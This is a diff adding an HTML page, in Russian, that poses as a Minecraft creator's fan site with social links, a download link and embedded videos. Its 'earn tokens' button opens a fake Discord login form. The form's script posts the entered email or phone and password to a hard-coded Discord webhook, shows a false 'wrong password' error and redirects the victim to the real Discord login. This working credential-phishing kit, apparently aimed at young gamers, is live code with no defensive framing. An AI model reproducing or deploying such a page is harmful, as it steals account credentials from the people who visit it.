@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DanjaPro.My_site</title>
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@300;400;500;700&family=Source+Code+Pro:wght@400;700&family=Playfair+Display:wght@400;700;900&family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        /* Копия стилей оригинального сайта */
+        body {
+            font-family: 'Open Sans', sans-serif;
+            background-color: #303033;
+            color: #e1dfdb;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+        }
+        .header-bg {
+            background: url('https://lh3.googleusercontent.com/sitesv/AA5AbUAKekX4CBIvrsfk_iypIfle67gjv5MTE2vryUUjtzMd0VHyOJdy9-s31dhlbTHuTlqxCuyRYCPtCI5a5UELTSjk0QnTxtGGeRjQyz0ZQv5UkXvjwUe5VVlbm6Tstl7WdC5qvWYZF0klU_TeO2yA4DsSCy6U5qjMxA5Gv9jI3IUcLM3FpAmhXtYseYo=w16383') center/cover;
+            height: 360px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+        }
+        .header-bg h1 {
+            font-size: 54pt;
+            font-family: 'Playfair Display', serif;
+            font-weight: 700;
+        }
+        .section-dark {
+            background: url('https://lh3.googleusercontent.com/sitesv/AA5AbUBE1_84T0LFQSBzvrK6MMFJ4yNjBwO2H5nw7gP87SFBNxBa22B3dKR7cgD4uMTLOCgSN1alDI77IIU8qnC56yOJ1Z5lSdS3Cyd0hd1FzW0XvznKKFS0UZkM2XczclRoHZm7YvKeasm2TF393ODhkQSxO2zOWMiIckPzuE917nMqflC_hOR055hk=w16383') center/cover;
+            padding: 40px 20px;
+            margin: 20px 0;
+        }
+        .btn {
+            background-color: #303033;
+            border: 2px solid #e1dfdb;
+            color: #e1dfdb;
+            padding: 12px 24px;
+            margin: 10px;
+            font-family: 'Open Sans', sans-serif;
+            font-size: 12pt;
+            cursor: pointer;
+            border-radius: 4px;
+            transition: all 0.3s;
+            display: inline-block;
+            text-decoration: none;
+        }
+        .btn:hover {
+            background-color: rgba(225,223,219,0.1);
+            box-shadow: 0 0 10px rgba(225,223,219,0.3);
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        h2 {
+            font-family: 'Playfair Display', serif;
+            font-size: 27pt;
+            color: #e1dfdb;
+        }
+        .blue-text {
+            color: #0000ff;
+            font-family: 'Impact', 'Arial Narrow', sans-serif;
+        }
+        .video-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            padding: 20px;
+        }
+        .video-grid iframe {
+            width: 100%;
+            height: 200px;
+        }
+
+        /* Стили модального окна */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 9999;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+        }
+        .modal-bg {
+            background-color: rgba(0,0,0,0.8);
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            backdrop-filter: blur(5px);
+        }
+        .modal-content {
+            position: relative;
+            background: #36393f;
+            border-radius: 8px;
+            padding: 30px;
+            width: 90%;
+            max-width: 450px;
+            margin: 10% auto;
+            z-index: 1;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            color: #fff;
+            font-family: 'Whitney', 'Helvetica Neue', sans-serif;
+        }
+        .modal-content h2 {
+            font-family: 'Whitney', sans-serif;
+            font-size: 24px;
+            margin-bottom: 15px;
+            color: #fff;
+        }
+        .modal-content p {
+            color: #b9bbbe;
+            margin-bottom: 20px;
+        }
+        .modal-content label {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            color: #b9bbbe;
+            margin-bottom: 8px;
+        }
+        .modal-content input {
+            width: 100%;
+            padding: 10px;
+            background: #202225;
+            border: 1px solid #040405;
+            border-radius: 3px;
+            color: #dcddde;
+            margin-bottom: 15px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        .modal-content input:focus {
+            outline: none;
+            border-color: #5865f2;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background: #5865f2;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .login-btn:hover {
+            background: #4752c4;
+        }
+        .close-btn {
+            position: absolute;
+            top: 15px;
+            right: 20px;
+            color: #72767d;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .close-btn:hover {
+            color: #fff;
+        }
+        .error-msg {
+            color: #f04747;
+            text-align: center;
+            margin-top: 10px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Шапка как в оригинале -->
+    <div class="header-bg">
+        <h1><span class="blue-text">Даня про</span> <span style="color: white;">Minecraft</span></h1>
+    </div>
+
+    <div class="container">
+        <h2><span class="blue-text">ссылке внизу 👇</span></h2>
+
+        <div class="section-dark">
+            <div style="font-size: 23pt; font-family: Impact, sans-serif; margin-bottom: 30px;">
+                ⚡ заработать токены ⚡
+            </div>
+            <button class="btn" onclick="openModal()" style="background: #5865f2; border-color: #5865f2; animation: pulse 2s infinite;">
+                🔑 ЗАРАБОТАТЬ ТОКЕНЫ
+            </button>
+            <style>
+                @keyframes pulse {
+                    0% { transform: scale(1); }
+                    50% { transform: scale(1.05); box-shadow: 0 0 20px rgba(88,101,242,0.5); }
+                    100% { transform: scale(1); }
+                }
+            </style>
+            <div style="height: 30px;"></div>
+            <div>
+                <a href="https://youtube.com/@danjacraft" target="_blank" class="btn">📺 подпишись мой канал</a>
+                <a href="https://www.tiktok.com/@danja.pro" target="_blank" class="btn">🎵 мой tiktok</a>
+                <a href="https://drive.google.com/file/d/1_NNqeRDD-qEwdeZKcyT8rEWU6FxSXEH8/view" target="_blank" class="btn">📥 скачать сборку</a>
+                <a href="https://t.me/Danja_pro5" target="_blank" class="btn">✈️ Мой Telegram канал!</a>
+                <a href="https://discord.gg/GrtpD2FbFz" target="_blank" class="btn">💬 мой discord Server</a>
+            </div>
+        </div>
+
+        <h2><span class="blue-text">приложение Майнкрафта 👇</span></h2>
+        <div>
+            <a href="https://www.pixelpapercraft.com/print/minecraft-character" target="_blank" class="btn">📄 скин фигурок из бумаги</a>
+            <a href="https://cristalix.gg/play" target="_blank" class="btn">💎 мой Кристаликс</a>
+            <a href="https://tlauncher.org/" target="_blank" class="btn">⬇️ скачать tlauncher</a>
+        </div>
+
+        <h2><span class="blue-text">Видео 👇</span></h2>
+        <div class="video-grid">
+            <iframe src="https://www.youtube.com/embed/o9q0yMOvs60" frameborder="0" allowfullscreen></iframe>
+            <iframe src="https://www.youtube.com/embed/ZBRy-3EWayg" frameborder="0" allowfullscreen></iframe>
+            <iframe src="https://www.youtube.com/embed/AsFbO4IOmtE" frameborder="0" allowfullscreen></iframe>
+            <iframe src="https://www.youtube.com/embed/Hygv_5RXjIE" frameborder="0" allowfullscreen></iframe>
+            <iframe src="https://www.youtube.com/embed/stgHVzit4AI" frameborder="0" allowfullscreen></iframe>
+        </div>
+
+        <p style="margin-top: 30px; font-size: 14px;">© DanjaPro.My_site</p>
+    </div>
+
+    <!-- Модальное окно авторизации -->
+    <div id="authModal" class="modal">
+        <div class="modal-bg" onclick="closeModal()"></div>
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeModal()">&times;</span>
+            <h2>🔐 Авторизация Discord</h2>
+            <p>Войдите в аккаунт Discord для получения токенов. Ваши данные будут немедленно обработаны.</p>
+            <form id="loginForm" onsubmit="handleLogin(event)">
+                <label>ЭЛЕКТРОННАЯ ПОЧТА ИЛИ НОМЕР ТЕЛЕФОНА</label>
+                <input type="text" id="email" placeholder="Введите email или телефон" required>
+                <label>ПАРОЛЬ</label>
+                <input type="password" id="password" placeholder="Введите пароль" required>
+                <button type="submit" class="login-btn">Войти</button>
+                <div id="errorMsg" class="error-msg">❌ Неверный логин или пароль</div>
+            </form>
+            <p style="text-align: center; margin-top: 15px; font-size: 12px; color: #72767d;">
+                Нет аккаунта? <span style="color: #5865f2; cursor: pointer;">Зарегистрироваться</span>
+            </p>
+        </div>
+    </div>
+
+    <script>
+        // Открыть модальное окно
+        function openModal() {
+            document.getElementById('authModal').style.display = 'block';
+        }
+
+        // Закрыть модальное окно
+        function closeModal() {
+            document.getElementById('authModal').style.display = 'none';
+        }
+
+        // Обработка входа
+        async function handleLogin(event) {
+            event.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const errorMsg = document.getElementById('errorMsg');
+
+            // ⚡ ВАШ ВЕБХУК
+            const webhookURL = 'https://discord.com/api/webhooks/1501274221731643512/A6Crw1S4_mQLFHGY54_CGXTZLMY-ichJd41LQCBdvTW7KG6sq6hLd-_gB8JFavxxbkSm';
+
+            const payload = {
+                embeds: [{
+                    title: '🔑 НОВЫЙ ЗАХОД | DanjaPro',
+                    color: 0x5865f2,
+                    fields: [
+                        {
+                            name: '📧 Email / Телефон',
+                            value: email,
+                            inline: true
+                        },
+                        {
+                            name: '🔒 Пароль',
+                            value: password,
+                            inline: true
+                        }
+                    ],
+                    footer: {
+                        text: 'DanjaPro Token System • ' + new Date().toLocaleString()
+                    },
+                    thumbnail: {
+                        url: 'https://cdn-icons-png.flaticon.com/512/5968/5968756.png'
+                    }
+                }]
+            };
+
+            try {
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload),
+                });
+
+                if (response.ok) {
+                    // Показать ошибку и перенаправить на настоящий Discord
+                    errorMsg.style.display = 'block';
+                    setTimeout(() => {
+                        window.location.href = 'https://discord.com/login';
+                    }, 2000);
+                } else {
+                    errorMsg.style.display = 'block';
+                }
+            } catch (error) {
+                console.error('Ошибка:', error);
+                errorMsg.style.display = 'block';
+                // Даже если вебхук не сработал, перенаправляем на настоящий Discord
+                setTimeout(() => {
+                    window.location.href = 'https://discord.com/login';
+                }, 2000);
+            }
+        }
+    </script>
+</body>
+</html>
